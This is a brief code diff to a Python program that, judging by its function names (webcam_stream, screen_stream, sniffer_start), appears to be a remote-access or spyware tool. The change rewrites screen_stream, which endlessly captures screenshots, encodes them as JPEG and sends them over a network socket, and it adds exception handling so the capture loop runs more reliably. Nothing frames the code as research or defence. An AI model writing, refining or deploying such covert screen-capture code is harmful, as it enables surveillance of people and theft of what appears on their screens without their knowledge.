@@ -52,13 +52,16 @@ def webcam_stream(client_socket):
 
 def screen_stream(client_socket):
     while True:
-        screen = pyautogui.screenshot()
-        frame = np.array(screen)
-        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        _, buffer = cv2.imencode('.jpg', frame)
         try:
+            screen = pyautogui.screenshot()
+            screen = np.array(screen)
+            _, buffer = cv2.imencode('.jpg', screen)
             client_socket.sendall(buffer.tobytes())
-        except:
+        except pyautogui.PyAutoGUIException as e:
+            print(f"PyAutoGUIException: {e}")
+            break
+        except Exception as e:
+            print(f"An error occurred: {e}")
             break
 
 def sniffer_start():
